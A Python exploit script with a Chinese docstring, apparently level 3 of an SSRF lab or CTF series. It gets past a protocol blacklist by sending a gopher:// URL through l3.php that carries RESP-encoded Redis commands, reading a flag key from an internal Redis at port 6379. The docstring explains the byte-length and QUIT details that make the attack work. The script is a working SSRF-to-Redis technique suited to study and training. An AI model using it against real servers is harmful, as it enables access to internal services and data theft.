"""L3 · 黑名单漏了 gopher，直接读 Redis

黑名单只挡了 file:// dict:// 这些「读本地文件」的协议，
没挡 gopher:// —— 而 gopher 能连内网任意 IP:PORT 并逐字节发数据。

两个容易翻车的点：
  1. RESP 里的 $<len> 必须是 key 的**真实字节数**。
     "l3_flag" 是 7 字节，写成 $8 会让 redis 把结尾的 \\r 吃进 key 里，
     查出来永远是 nil。
  2. 末尾补一条 QUIT。redis 默认不主动关连接，curl 会一直等到超时，
     然后返回 false、把已经收到的数据全丢掉。QUIT 让它主动断开，
     curl 就能正常拿到响应。

跑法：
    python3 03_redis_read.py
"""

import sys

from _util import gopher_url, report, send


def resp(*args):
    """把命令编码成 RESP 数组。redis 最稳的写法。"""
    out = b"*%d\r\n" % len(args)
    for a in args:
        b = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(b), b)
    return out


def main():
    payload = resp("GET", "l3_flag") + resp("QUIT")
    print("要发出去的字节：")
    print(repr(payload))
    print()

    url = gopher_url("redis", 6379, payload)
    print("gopher URL:", url)
    print()

    body = send("l3.php", url)
    return 0 if report(body) else 1


if __name__ == "__main__":
    sys.exit(main())
